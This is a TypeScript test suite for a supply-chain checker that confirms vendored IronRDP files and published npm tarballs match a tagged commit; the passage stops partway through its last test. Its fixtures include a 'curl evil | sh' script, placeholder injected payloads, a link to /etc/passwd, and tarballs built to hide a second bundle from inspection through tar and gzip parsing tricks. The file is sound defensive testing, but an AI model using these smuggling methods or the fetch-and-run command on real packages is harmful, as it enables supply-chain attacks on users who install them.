// vendor/ is IronRDP's web client and its WebAssembly as scripts/build-ironrdp.sh built them, from ironrdp/BASE_COMMIT
// with the patch series applied. The build records both sides in vendor/SHA256SUMS: a vendor/ file changed any other
// way, or a series changed without a rebuild, fails here. Whether the files are what those sources build to is for
// CI's rebuild (.github/workflows/ironrdp.yml), and whether a release holds them for the publish job; both run
// scripts/check-vendor.mjs, as the rest of this file does, against made-up repositories and packages. Needs git,
// nothing built: npm run test:unit
import { after, test } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync, spawnSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { gunzipSync, gzipSync } from 'node:zlib'
import { freeRDPFiles, freeRDPMetadata, freeRDPPackage, runtimeMetadata } from '../../scripts/package-metadata.mjs'
import { helperFile, SUMS, TARGETS } from '../../scripts/build-helper.mjs'
import { MANIFEST, checkBase, checkPackage, checkTree, compareRebuilt, sha256 } from '../../scripts/check-vendor.mjs'

const root = fileURLToPath(new URL('../../', import.meta.url))

test('vendor/SHA256SUMS lists the base commit, each patch and each file in vendor/', () => {
    const { unlisted, missing, odd } = checkTree(root)
    assert.deepEqual({ unlisted, missing, odd }, { unlisted: [], missing: [], odd: [] },
        'vendor/ was built from other patches, or changed by hand: npm run build:ironrdp rebuilds it')
})

test('vendor/ and the series are what vendor/SHA256SUMS records', () => {
    assert.deepEqual(checkTree(root).changed, [], 'changed since vendor/ was built: npm run build:ironrdp rebuilds it')
})

const scratch = fs.mkdtempSync(path.join(os.tmpdir(), 'trd-vendor-'))
after(() => fs.rmSync(scratch, { recursive: true, force: true }))
let made = 0
const fresh = (name: string) => path.join(scratch, `${name}-${++made}`)

/** git without this machine's configuration, so that commits work anywhere (no signing, any identity). */
function git (cwd: string, ...args: string[]): string {
    return execFileSync('git', ['-c', 'user.name=test', '-c', 'user.email=test@example.invalid', '-c', 'commit.gpgsign=false',
        '-c', 'init.defaultBranch=main', ...args], {
        cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' },
    })
}

type Files = Record<string, string | Buffer | { link: string }>

/** What a build makes from a base commit and two patches. The WebAssembly has line feeds in it, as the real one does. */
const BUILD: Record<string, string | Buffer> = {
    'ironrdp/BASE_COMMIT': '9b151c4c2e47c6014e1e8e55909d4180aa8bdb99\n',
    'ironrdp/patches/0001-fix-one-thing.patch': 'From 0000000000000000000000000000000000000000\nSubject: one\n',
    'ironrdp/patches/0002-fix-another.patch': 'From 0000000000000000000000000000000000000000\nSubject: another\n',
    'vendor/IRONRDP-LICENSE': 'MIT License\n',
    'vendor/iron-remote-desktop.js': 'export const one = 1\nexport const two = 2\n',
    'vendor/ironrdp_web_bg.wasm': Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x0a, 0x01, 0x0a, 0x0d, 0x0a]),
}

/** vendor/SHA256SUMS for those files as the build writes it: comments saying how it was built, then a line each. */
function list (files: Record<string, string | Buffer>, node = 'v26.8.2'): string {
    return [
        `# vendor/ is IronRDP ${String(files['ironrdp/BASE_COMMIT']).trim()} with the patches below, built by scripts/build-ironrdp.sh with`,
        `# rustc 1.94.1, wasm-pack 0.15.0 and Node.js ${node}, on aarch64-apple-darwin.`,
        ...Object.keys(files).sort().map(file => `${sha256(Buffer.from(files[file]))}  ${file}`),
    ].join('\n') + '\n'
}

/** Writes files into a folder: their contents, or a link. */
function write (dir: string, files: Files): string {
    for (const [file, content] of Object.entries(files)) {
        fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true })
        if (typeof content === 'object' && 'link' in content) {
            fs.symlinkSync(content.link, path.join(dir, file))
        } else {
            fs.writeFileSync(path.join(dir, file), content)
        }
    }
    return dir
}

/** A checkout with a build's files and its list, and anything else given. */
const checkout = (files = BUILD, more: Files = {}) => write(fresh('checkout'), { ...files, [MANIFEST]: list(files), ...more })

/** The same, committed. */
function repository (files = BUILD, more: Files = {}): string {
    const dir = checkout(files, more)
    git(dir, 'init', '-q')
    git(dir, 'add', '-A')
    git(dir, 'commit', '-q', '-m', 'vendor/ built')
    return dir
}

/** CI's rebuild in a repository: vendor/ emptied, then what the build made this time, with its list. */
function rebuild (dir: string, files = BUILD, node = 'v22.22.2', more: Files = {}): void {
    fs.rmSync(path.join(dir, 'vendor'), { recursive: true, force: true })
    write(dir, { ...Object.fromEntries(Object.entries(files).filter(([file]) => file.startsWith('vendor/'))), [MANIFEST]: list(files, node), ...more })
}

test('a file in vendor/ that the build did not make fails the list check, hidden or not, whatever its name', () => {
    for (const name of ['extra.js', 'extra file.js', 'extrá.js', 'sub dir/x.js', 'iron*', '.extra blob', '.npmignore']) {
        assert.deepEqual(checkTree(checkout(BUILD, { [`vendor/${name}`]: 'globalThis.pwned = 1\n' })).unlisted, [`vendor/${name}`], name)
    }
    // Finder's folder settings: npm never packs them.
    assert.deepEqual(checkTree(checkout(BUILD, { 'vendor/.DS_Store': 'Bud1' })).unlisted, [])
})

test('a link in vendor/ fails the list check, even to the right bytes', () => {
    const elsewhere = write(fresh('elsewhere'), { 'module.wasm': BUILD['vendor/ironrdp_web_bg.wasm'] })
    const dir = checkout()
    fs.rmSync(path.join(dir, 'vendor/ironrdp_web_bg.wasm'))
    write(dir, { 'vendor/ironrdp_web_bg.wasm': { link: path.join(elsewhere, 'module.wasm') } })
    const result = checkTree(dir)
    assert.deepEqual([result.odd, result.missing], [['vendor/ironrdp_web_bg.wasm'], ['vendor/ironrdp_web_bg.wasm']])
})

test('only text files may differ from the list by their line ends (a Windows checkout), not the WebAssembly', () => {
    const crlf = (text: string | Buffer) => String(text).replaceAll('\n', '\r\n')
    const windows = checkout(BUILD, {
        'vendor/iron-remote-desktop.js': crlf(BUILD['vendor/iron-remote-desktop.js']),
        'ironrdp/patches/0001-fix-one-thing.patch': crlf(BUILD['ironrdp/patches/0001-fix-one-thing.patch']),
        [MANIFEST]: crlf(list(BUILD)),
    })
    assert.deepEqual(checkTree(windows), { unlisted: [], missing: [], changed: [], odd: [] })

    const wasm = BUILD['vendor/ironrdp_web_bg.wasm'] as Buffer
    const withCr = Buffer.from(wasm.toString('latin1').replaceAll('\n', '\r\n'), 'latin1')
    assert.notEqual(withCr.length, wasm.length)
    assert.deepEqual(checkTree(checkout(BUILD, { 'vendor/ironrdp_web_bg.wasm': withCr })).changed, ['vendor/ironrdp_web_bg.wasm'])
})

test("CI's rebuild comparison passes a rebuild that matches, whatever Node.js the list's comments name", () => {
    const dir = repository()
    rebuild(dir, BUILD, 'v22.22.2')
    const result = compareRebuilt(dir)
    assert.deepEqual(result.listDifferences, [])
    assert.equal(result.same, true)
    assert.deepEqual(result.files.map(file => [file.file, file.same]),
        [['vendor/IRONRDP-LICENSE', true], ['vendor/iron-remote-desktop.js', true], ['vendor/ironrdp_web_bg.wasm', true]])
})

test("CI's rebuild comparison catches a committed file the build doesn't make, whatever its name", () => {
    for (const name of ['extra.js', 'extra file.js', 'extrá.js', 'sub dir/x.js', 'iron*', '.extra blob']) {
        const dir = repository(BUILD, { [`vendor/${name}`]: 'globalThis.pwned = 1\n' })
        rebuild(dir)
        const result = compareRebuilt(dir)
        assert.equal(result.same, false, name)
        assert.deepEqual(result.files.filter(file => !file.same).map(file => [file.file, file.rebuilt]), [[`vendor/${name}`, null]], name)
    }
})

test("CI's rebuild comparison catches a changed, missing or extra rebuilt file, and lists that differ", () => {
    const changed = { ...BUILD, 'vendor/ironrdp_web_bg.wasm': Buffer.from('\0asm\x01\0\0\0 other') }
    let dir = repository()
    rebuild(dir, changed)
    let result = compareRebuilt(dir)
    assert.deepEqual(result.files.filter(file => !file.same).map(file => file.file), ['vendor/ironrdp_web_bg.wasm'])
    assert.equal(result.listDifferences.length, 1)

    dir = repository()
    rebuild(dir)
    fs.rmSync(path.join(dir, 'vendor/iron-remote-desktop.js'))
    result = compareRebuilt(dir)
    assert.deepEqual(result.files.filter(file => !file.same).map(file => [file.file, file.rebuilt]), [['vendor/iron-remote-desktop.js', null]])

    dir = repository()
    rebuild(dir, BUILD, 'v22.22.2', { 'vendor/.extra': 'x' })
    assert.deepEqual(compareRebuilt(dir).files.filter(file => !file.same).map(file => [file.file, file.committed]), [['vendor/.extra', null]])

    // Finder's folder settings in the rebuilt folder aren't the build's, but a committed one is a difference.
    dir = repository()
    rebuild(dir, BUILD, 'v22.22.2', { 'vendor/.DS_Store': 'Bud1' })
    assert.equal(compareRebuilt(dir).same, true)
    dir = repository(BUILD, { 'vendor/.DS_Store': 'Bud1' })
    rebuild(dir)
    assert.deepEqual(compareRebuilt(dir).files.filter(file => !file.same).map(file => [file.file, file.rebuilt]), [['vendor/.DS_Store', null]])

    // The commit's list names other patches than the rebuild's: the files match, the series doesn't.
    dir = repository()
    rebuild(dir, { ...BUILD, 'ironrdp/patches/0002-fix-another.patch': 'Subject: changed\n' })
    result = compareRebuilt(dir)
    assert.equal(result.same, false)
    assert.match(result.listDifferences.join('\n'), /^ironrdp\/patches\/0002-fix-another\.patch: committed [0-9a-f]{64}, rebuilt [0-9a-f]{64}$/)
})

test("CI's rebuild comparison refuses a link in vendor/, committed or rebuilt", () => {
    let dir = repository(BUILD, { 'vendor/iron-remote-desktop-rdp.js': { link: 'iron-remote-desktop.js' } })
    rebuild(dir)
    let result = compareRebuilt(dir)
    assert.equal(result.same, false)
    assert.deepEqual(result.odd, ['vendor/iron-remote-desktop-rdp.js (committed, git mode 120000)'])

    dir = repository()
    rebuild(dir, BUILD, 'v22.22.2', { 'vendor/linked.js': { link: 'iron-remote-desktop.js' } })
    result = compareRebuilt(dir)
    assert.equal(result.same, false)
    assert.deepEqual(result.odd, ['vendor/linked.js (rebuilt, not a file)'])
})

type Entry = { path: string, data?: string | Buffer, type?: string, link?: string, prefix?: string, magic?: string, mode?: string }

/** A gzipped tar of the entries, as npm pack writes one (ustar headers), then its end: two empty blocks, or `end`. A
 * type of 2 is a link, 5 a folder; a prefix is the folder part of a long name, which ustar keeps apart. Entries in more
 * come after a single empty block, where npm's tar reader reads on. */
function tarball (entries: Entry[], more: Entry[] = [], end = Buffer.alloc(1024)): string {
    const blocks: Buffer[] = []
    const add = ({ path: name, data = '', type = '0', link = '', prefix = '', magic = 'ustar\u000000', mode = '0000644' }: Entry) => {
        const body = Buffer.from(data)
        const header = Buffer.alloc(512)
        header.write(name, 0, 100, 'utf8')
        header.write(`${mode}\0`, 100, 'latin1')
        header.write('0000000\0', 108, 'latin1')
        header.write('0000000\0', 116, 'latin1')
        header.write(`${body.length.toString(8).padStart(11, '0')}\0`, 124, 'latin1')
        header.write('14657232400\0', 136, 'latin1')
        header.write(type, 156, 'latin1')
        header.write(link, 157, 100, 'utf8')
        header.write(magic, 257, 8, 'latin1')
        header.write(prefix, 345, 155, 'utf8')
        header.fill(0x20, 148, 156)
        header.write(`${header.reduce((sum, byte) => sum + byte, 0).toString(8).padStart(6, '0')}\0 `, 148, 'latin1')
        blocks.push(header, body, Buffer.alloc((512 - body.length % 512) % 512))
    }
    entries.forEach(add)
    if (more.length > 0) {
        blocks.push(Buffer.alloc(512))
        more.forEach(add)
    }
    blocks.push(end)
    const file = `${fresh('package')}.tgz`
    fs.writeFileSync(file, gzipSync(Buffer.concat(blocks)))
    return file
}

/** The repository's package: what npm packs from it (vendor/, package.json, the README) and a built dist/. */
const PACKAGE: Record<string, string | Buffer> = {
    'package.json': '{\n  "name": "tabby-rdp",\n  "version": "1.2.3"\n}\n',
    'README.md': '# tabby-rdp\n',
}
const DIST = { 'dist/index.js': 'exports.ok = true\n' }
const packaged = (files = BUILD) => [
    ...Object.entries(files).filter(([file]) => file.startsWith('vendor/')),
    [MANIFEST, list(files)] as const,
    ...Object.entries(PACKAGE),
]
const entries = (files: (readonly [string, string | Buffer])[]): Entry[] => files.map(([file, data]) => ({ path: `package/${file}`, data }))

/** A repository with the package's files, tagged with its version. */
function released (): string {
    const dir = repository(BUILD, PACKAGE)
    git(dir, 'tag', 'v1.2.3')
    return dir
}

test("the publish check passes the tagged commit's package, finding the tag by the package's version", () => {
    const dir = released()
    const result = checkPackage(dir, tarball(entries([...packaged(), ...Object.entries(DIST)])))
    assert.deepEqual(result.problems, [])
    assert.deepEqual([result.revision, result.version, result.vendor, result.built], ['v1.2.3', '1.2.3', 3, 1])
})

test("the publish check reads the tag's list, not the package's: a changed file and its line in the package's list fail", () => {
    const dir = released()
    const tampered = { ...BUILD, 'vendor/ironrdp_web_bg.wasm': Buffer.from('\0asm\x01\0\0\0 backdoor') }
    // The package's own list vouches for the changed file: `shasum -c vendor/SHA256SUMS` in it would pass.
    const files = packaged(tampered)
    const own = String(files.find(([file]) => file === MANIFEST)?.[1])
    assert.ok(own.includes(sha256(tampered['vendor/ironrdp_web_bg.wasm'])))
    const result = checkPackage(dir, tarball(entries(files)))
    assert.deepEqual(result.problems, [
        'vendor/ironrdp_web_bg.wasm: not as in v1.2.3',
        'vendor/SHA256SUMS: not as in v1.2.3',
        "vendor/ironrdp_web_bg.wasm: not what v1.2.3's vendor/SHA256SUMS records",
    ])
})

test('the publish check fails a package missing a vendor/ file, or with one the list does not have', () => {
    const dir = released()
    const files = packaged().filter(([file]) => file !== 'vendor/iron-remote-desktop.js')
    assert.deepEqual(checkPackage(dir, tarball(entries(files))).problems, ['vendor/iron-remote-desktop.js: missing from the package'])

    const extra = checkPackage(dir, tarball(entries([...packaged(), ['vendor/.extra blob', 'globalThis.pwned = 1\n']]))).problems
    assert.deepEqual(extra, ['vendor/.extra blob: not a file in v1.2.3', "vendor/.extra blob: not in v1.2.3's vendor/SHA256SUMS"])
})

test('the publish check fails a file outside dist/ that the tag does not have, or has otherwise', () => {
    const dir = released()
    assert.deepEqual(checkPackage(dir, tarball(entries([...packaged(), ['remote/helper.sh', 'curl evil | sh\n']]))).problems,
        ['remote/helper.sh: not a file in v1.2.3'])
    const changed = packaged().map(([file, data]) => [file, file === 'README.md' ? '# tabby-rdp, changed\n' : data] as const)
    assert.deepEqual(checkPackage(dir, tarball(entries(changed))).problems, ['README.md: not as in v1.2.3'])
})

test("dist/ is built, so only another build's package can vouch for it (--same-as)", () => {
    const dir = released()
    const staged = tarball(entries([...packaged(), ['dist/index.js', 'exports.ok = "backdoor"\n']]))
    assert.deepEqual(checkPackage(dir, staged).problems, [])
    const local = tarball(entries([...packaged(), ...Object.entries(DIST)]))
    assert.deepEqual(checkPackage(dir, staged, { sameAs: local }).problems, [`dist/index.js: not as in ${local}`])
    assert.deepEqual(checkPackage(dir, local, { sameAs: local }).problems, [])
})

test('the publish check fails links, a name twice, names outside the package folder and names one in two cases', () => {
    const dir = released()
    const good = entries(packaged())
    const problems = (more: Entry[]) => checkPackage(dir, tarball([...good, ...more]), { revision: 'v1.2.3' }).problems.map(p => p.replace(/ in \S+\.tgz/, ''))
    assert.deepEqual(problems([{ path: 'package/dist/link.js', type: '2', link: '/etc/passwd' }]), ['dist/link.js: not a plain file (tar type 2)'])
    assert.deepEqual(problems([{ path: 'package/README.md', data: '# changed\n' }]), ['README.md: in it twice', 'README.md: not as in v1.2.3'])
    assert.deepEqual(problems([{ path: 'other/vendor/x.js', data: 'x' }]), ['other/vendor/x.js: not a file in the package\'s folder'])
    assert.deepEqual(problems([{ path: 'package/../x.js', data: 'x' }]), ['package/../x.js: not a file in the package\'s folder'])
    assert.deepEqual(problems([{ path: 'package/dist/Index.js', data: 'x' }, { path: 'package/dist/index.js', data: 'y' }]),
        ['dist/index.js and dist/Index.js: one file on a disk that ignores case'])
})

test('the publish check fails a folder entry, where a required file is or anywhere: an extractor makes a folder at its path', () => {
    // npm pack writes files only, and the check read a folder entry as nothing: an extractor makes the folder all the
    // same, at the path of a file the package has (a required one, say), or at one it hasn't.
    const dir = released()
    const good = entries([...packaged(), ...Object.entries(DIST)])
    const problems = (file: string, sameAs?: string) => checkPackage(dir, file, { revision: 'v1.2.3', ...sameAs ? { sameAs } : {} }).problems.map(p => p.replace(/ in \S+\.tgz/, ''))
    const folder = (path: string): Entry => ({ path, type: '5' })
    const wasm = 'package/vendor/ironrdp_web_bg.wasm'
    const withFolder = (...more: Entry[]) => tarball([...good, ...more])
    const message = (path: string) => `${path}: a folder, which npm pack doesn't write and an extractor makes at that path`
    assert.deepEqual(problems(withFolder(folder(wasm))), [message(wasm)])
    assert.deepEqual(problems(withFolder(folder(`${wasm}/`))), [message(`${wasm}/`)])
    // Ahead of the file, at a file of another place, or a folder of its own.
    assert.deepEqual(problems(tarball([folder(wasm), ...good])), [message(wasm)])
    assert.deepEqual(problems(withFolder(folder('package/dist/'), folder('package/'))), [message('package/dist/'), message('package/')])
    // Against another package (--same-as): the one checked, or the one it is compared with.
    const clean = tarball(good)
    assert.deepEqual(problems(clean, clean), [])
    assert.deepEqual(problems(withFolder(folder(wasm)), clean), [message(wasm)])
    assert.deepEqual(problems(clean, withFolder(folder(wasm))), [message(wasm)])
})

test('the publish check fails a package with more after its end, which npm would install unchecked', () => {
    // npm's tar reader (node-tar) takes a single empty block for a gap and reads on: a check that stopped there would
    // pass this package, and npm would install the bundle that follows over the one checked.
    const dir = released()
    const hidden = tarball(entries(packaged()), [{ path: 'package/vendor/iron-remote-desktop.js', data: 'globalThis.pwned = 1\n' }])
    assert.throws(() => checkPackage(dir, hidden), /more after the end of the archive \(byte \d+\), which npm would unpack too/)
})

test('the publish check fails a package with more after its gzip member, which npm would unpack too', () => {
    // Node's gunzip reads one member and stops at a zero byte after it; npm's reader (node-tar, fed the package in
    // pieces as it comes) starts again at the next piece, and unpacks a member there. The first member here is the
    // package without its end, then come zeros to a 64 KB boundary, then a member with another bundle: gunzip shows
    // the package as it should be, and npm would install the other bundle in its place.
    const dir = released()
    const unpacked = (file: string) => gunzipSync(fs.readFileSync(file))
    const good = unpacked(tarball(entries([...packaged(), ...Object.entries(DIST)])))
    // Its end is two empty blocks.
    const open = good.subarray(0, good.length - 1024)
    const other = unpacked(tarball([{ path: 'package/vendor/iron-remote-desktop.js', data: 'globalThis.pwned = 1\n' }]))
    const file = (...parts: Buffer[]) => {
        const name = `${fresh('gzip')}.tgz`
        fs.writeFileSync(name, Buffer.concat(parts))
        return name
    }
    const first = gzipSync(open)
    const piece = 64 * 1024
    const hidden = file(first, Buffer.alloc(piece - first.length % piece), gzipSync(other))
    // gunzip alone, as the check read a package before: the package as it should be, and nothing of the bundle after it.
    assert.deepEqual(unpacked(hidden), open)
    assert.throws(() => checkPackage(dir, hidden), /: \d+ bytes after its gzip member, which npm pack doesn't write and npm's reader can unpack$/)
    // Nor anything else after the member: zeros, or a second member right after it.
    assert.throws(() => checkPackage(dir, file(gzipSync(good), Buffer.alloc(512))), /: 512 bytes after its gzip member/)
    assert.throws(() => checkPackage(dir, file(first, gzipSync(other))), /bytes after its gzip member/)
    // A header with more in it than npm pack writes (a file name): only the plain one is read.
    const named = gzipSync(good)
    named[3] = 0x08
    assert.throws(() => checkPackage(dir, file(named.subarray(0, 10), Buffer.from('package.tar\0'), named.subarray(10))), /: not gzip as npm pack writes it/)
    // A member that fails its check, or is cut short, fails as before.
    const damaged = gzipSync(good)
    damaged[damaged.length - 8] ^= 1
    assert.throws(() => checkPackage(dir, file(damaged)), /: incorrect data check$/)
    assert.throws(() => checkPackage(dir, file(gzipSync(good).subarray(0, -4))), /: unexpected end of file$/)
    // The one member npm pack writes, and nothing after it, passes.
    assert.deepEqual(checkPackage(dir, file(gzipSync(good))).problems, [])
})

/** A pax record as tar writes it, its own length first. */
function record (key: string, value: string): string {
    const rest = ` ${key}=${value}\n`
    let length = rest.length + 1
    while (`${length}${rest}`.length !== length) {
        length++
    }
    return `${length}${rest}`
}

test('the publish check reads a long name as npm pack writes one: a ustar prefix, or a pax header ahead', () => {
    const dir = released()
    const long = (to: (entry: Entry) => Entry[]) => entries(packaged()).flatMap(entry => entry.path === 'package/vendor/iron-remote-desktop.js' ? to(entry) : [entry])
    assert.deepEqual(checkPackage(dir, tarball(long(entry => [{ ...entry, path: 'iron-remote-desktop.js', prefix: 'package/vendor' }]))).problems, [])
    const pax = { path: 'PaxHeader/iron-remote-desktop.js', type: 'x', data: record('path', 'package/vendor/iron-remote-desktop.js') + record('mtime', '499162500') }
    assert.deepEqual(checkPackage(dir, tarball(long(entry => [pax, { ...entry, path: 'iron-remote-desktop.js' }]))).problems, [])
})

test('the publish check fails a tarball npm would read otherwise, rather than check other files than npm installs', () => {
    // node-tar, npm's tar reader, skips a header it finds wrong (a file with a link target) and reads that entry's data
    // as the next headers, and takes a folder's data, or a file's whose name ends in a slash, for none: from the first
    // three of these tarballs it would install a bundle that a reader stepping over the data never sees. The others
    // are tar that npm pack doesn't write either, which readers read in different ways.
    const dir = released()
    // The data each of them carries: a header and the changed bundle, which node-tar would read as an entry.
    const body = gunzipSync(fs.readFileSync(tarball([{ path: 'package/vendor/iron-remote-desktop.js', data: 'globalThis.pwned = 1\n' }]))).subarray(0, 1024)
    const hidden = (entry: Entry) => tarball([...entries(packaged()), entry])
    const cases: [Entry, RegExp][] = [
        [{ path: 'package/dist/a.js', link: 'b.js', data: body }, /names a link target for what is no link/],
        [{ path: 'package/dist/', type: '5', data: body }, /is a folder with data/],
        [{ path: 'package/dist/a.js/', data: body }, /is a file whose name ends in a slash/],
        [{ path: 'package/dist/a.js\0x', data: body }, /has more in a field \(byte 0\) after its end/],
        [{ path: 'package/dist/a.js', magic: 'ustar  \0', data: body }, /hasn't ustar's magic and version/],
        [{ path: '././@LongLink', type: 'L', data: 'package/dist/a.js\0' }, /is of a kind that isn't a file, a folder or a link \(tar type L\)/],
    ]
    for (const [entry, error] of cases) {
        assert.throws(() => checkPackage(dir, hidden(entry)), error, entry.path)
    }
    const pax = (...records: string[]): Entry => ({ path: 'PaxHeader/a.js', type: 'x', data: records.join('') })
    const paxCases: [Entry[], RegExp][] = [
        [[pax(record('path', 'dist/a.js')), { path: 'a.js', prefix: 'package', data: body }], /has a ustar prefix besides a pax name/],
        [[pax(record('path', 'package/dist/a.js'), record('linkpath', 'x')), { path: 'a.js', data: body }], /has a pax record npm pack doesn't write \(linkpath\)/],
        [[pax(record('path', 'package/dist/a.js'), record('type', '5')), { path: 'a.js', data: body }], /has a pax record npm pack doesn't write \(type\)/],
        [[pax(record('path', 'package/dist/a.js')), pax(record('path', 'package/dist/b.js')), { path: 'a.js', data: body }], /is a second pax header in a row/],
        [[pax(`99 path=package/dist/a.js\n`), { path: 'a.js', data: body }], /has a pax record that is not one/],
        // A name that ends in a slash in the ustar header, which the pax name leaves off: a folder to node-tar too.
        [[pax(record('path', 'package/dist/a.js')), { path: 'package/dist/a.js/', data: body }], /is a file whose name ends in a slash/],
        // A pax header with no entry after it.
        [[pax(record('path', 'package/dist/a.js'))], /a pax header with no entry after it/],
    ]
    for (const [more, error] of paxCases) {
        assert.throws(() => checkPackage(dir, tarball([...entries(packaged()), ...more])), error)
    }
    // An archive that doesn't end in empty blocks: out of data right after an entry, or with a part of a block (zeros
    // or not) where the next header would be, which a reader reading blocks never sees.
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(0))), /no empty blocks at its end/)
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.from('a part of a header'))), /18 bytes after its last entry, less than a block/)
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(100))), /100 bytes after its last entry, less than a block/)
    // Less than an empty block is no end either.
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(511))), /511 bytes after its last entry, less than a block/)
    // One empty block alone, or whole ones and a part of one more: not the end npm pack writes either.
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(512))), /its end is 512 bytes of zeros/)
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(1124))), /its end is 1124 bytes of zeros/)
    // The end as npm pack writes it passes, and so does one with more empty blocks after it (it pads to a record).
    assert.deepEqual(checkPackage(dir, tarball(entries(packaged()), [], Buffer.alloc(10240))).problems, [])
})

/** The script run as the workflows run it, from a copy in a made-up repository (it checks the repository it is in): its
 * exit code, what it printed, and what it added to the run's summary. */
function command (dir: string, ...args: string[]): { status: number | null, output: string, summary: string } {
    fs.mkdirSync(path.join(dir, 'scripts'), { recursive: true })
    for (const script of ['check-vendor.mjs', 'package-metadata.mjs', 'build-helper.mjs']) {
        fs.copyFileSync(path.join(root, 'scripts', script), path.join(dir, 'scripts', script))
    }
    const summary = `${fresh('summary')}.md`
    fs.writeFileSync(summary, '')
    // Without GITHUB_ACTIONS, errors come as plain lines rather than as annotations for the run around the tests.
    const env: NodeJS.ProcessEnv = { ...process.env, GITHUB_STEP_SUMMARY: summary }
    delete env.GITHUB_ACTIONS
    const run = spawnSync(process.execPath, [path.join(dir, 'scripts/check-vendor.mjs'), ...args], { cwd: dir, encoding: 'utf8', env })
    return { status: run.status, output: run.stdout + run.stderr, summary: fs.readFileSync(summary, 'utf8') }
}

test("CI's rebuild comparison as a command: exit 0 for the same files, 1 for a file the build doesn't make, both in the summary", () => {
    let dir = repository()
    rebuild(dir)
    let run = command(dir, 'rebuilt')
    assert.equal(run.status, 0, run.output)
    assert.match(run.output, /^vendor\/ is byte for byte what the series builds to\.$/m)
    assert.match(run.summary, /^\| `vendor\/ironrdp_web_bg\.wasm` \| `[0-9a-f]{64}` \| `[0-9a-f]{64}` \| same \|$/m)

    dir = repository(BUILD, { 'vendor/.extra blob': 'globalThis.pwned = 1\n' })
    rebuild(dir)
    run = command(dir, 'rebuilt')
    assert.equal(run.status, 1, run.output)
    assert.match(run.output, /^vendor\/\.extra blob: DIFFERENT\n {2}committed [0-9a-f]{64}\n {2}rebuilt {3}none$/m)
    assert.match(run.summary, /^\| `vendor\/\.extra blob` \| `[0-9a-f]{64}` \| `none` \| DIFFERENT \|$/m)
    assert.match(run.output, /^vendor\/ is not what IronRDP and ironrdp\/patches build to here\./m)
})

test("the publish check as a command: exit 0 for the tagged commit's package, 1 for another, and no options of git's", () => {
    const dir = released()
    let run = command(dir, 'package', tarball(entries([...packaged(), ...Object.entries(DIST)])))
    assert.equal(run.status, 0, run.output)

    run = command(dir, 'package', tarball(entries(packaged({ ...BUILD, 'vendor/iron-remote-desktop.js': 'globalThis.pwned = 1\n' }))))
    assert.equal(run.status, 1, run.output)
    assert.match(run.output, /^ {2}vendor\/iron-remote-desktop\.js: not what v1\.2\.3's vendor\/SHA256SUMS records$/m)

    // As a revision, git would read it as an option.
    run = command(dir, 'package', tarball(entries(packaged())), '--ignore-missing')
    assert.equal(run.status, 1, run.output)
    assert.match(run.output, /^usage: /m)
})

test('the publish check needs the tag in the repository', () => {
    const dir = repository(BUILD, PACKAGE)
    assert.throws(() => checkPackage(dir, tarball(entries(packaged()))), /v1\.2\.3 is not in this repository/)
})

test("the base commit has to be in IronRDP's history, not just fetchable through its address (a fork's)", () => {
    // IronRDP, with a fork's commit fetchable through it, as GitHub serves forks' commits.
    const upstream = fresh('upstream')
    fs.mkdirSync(upstream)
    git(upstream, 'init', '-q')
    const commit = (message: string) => {
        git(upstream, 'commit', '-q', '--allow-empty', '-m', message)
        return git(upstream, 'rev-parse', 'HEAD').trim()
    }
    const first = commit('one')
    const second = commit('two')
    git(upstream, 'branch', '-m', 'master')
    git(upstream, 'checkout', '-q', '-b', 'fork', first)
    const fork = commit('a fork')
    git(upstream, 'checkout', '-q', 'master')
    git(upstream, 'config', 'uploadpack.allowFilter', 'true')
    git(upstream, 'config', 'uploadpack.allowAnySHA1InWant', 'true')

    const base = (sha: string) => checkBase(write(fresh('base'), { 'ironrdp/BASE_COMMIT': `${sha}\n` }), { upstream: `file://${upstream}` }).upstream
    assert.equal(base(first), true)
    assert.equal(base(second), true)
    assert.equal(base(fork), false)
    assert.equal(base('0123456789abcdef0123456789abcdef01234567'), false)
    assert.throws(() => base('master'), /not a commit/)
    // No history, no answer: the build stops rather than go on unchecked.
    assert.throws(() => checkBase(write(fresh('base'), { 'ironrdp/BASE_COMMIT': `${first}\n` }), { upstream: `file://${upstream}-missing` }),
        /ironrdp\/BASE_COMMIT can't be checked: IronRDP's history \(file:\/\/.*-missing, master\) didn't come: /)
})


test('format 1 (0.5.5): runtime publication excludes development tools and preserves the committed runtime lock', () => {
    const manifest = { name: 'tabby-rdp', version: '1.2.3', tabbyRdp: { packageFormat: 1 },
        dependencies: { runtime: '1.0.0' }, devDependencies: { browserTester: '2.0.0' }, scripts: { build: 'compiler' } }
    const lock = { name: manifest.name, version: manifest.version, lockfileVersion: 3,
        packages: { '': { ...manifest }, 'node_modules/runtime': { version: '1.0.0', integrity: 'sha512-runtime' },
            'node_modules/browserTester': { version: '2.0.0', dev: true } } }
    const before = JSON.stringify({ manifest, lock })
    const metadata = runtimeMetadata(manifest, lock)
    const published = JSON.parse(metadata['package.json'].toString())
    const publishedLock = JSON.parse(metadata['npm-shrinkwrap.json']!.toString())
    assert.equal(published.devDependencies, undefined)
    assert.equal(published.scripts, undefined)
    assert.equal(publishedLock.packages[''].devDependencies, undefined)
    assert.deepEqual(published.dependencies, manifest.dependencies)
    assert.deepEqual(publishedLock.packages['node_modules/runtime'], lock.packages['node_modules/runtime'])
    assert.equal(publishedLock.packages['node_modules/browserTester'], undefined)
    assert.equal(JSON.stringify({ manifest, lock }), before, 'packing must not mutate build metadata')

    const committed = { 'package.json': JSON.stringify(manifest), 'npm-shrinkwrap.json': JSON.stringify(lock) }
    const dir = repository(BUILD, committed)
    const contents = [...packaged().filter(([name]) => name !== 'package.json' && name !== 'README.md'),
        ...Object.entries(metadata), ...Object.entries(DIST)]
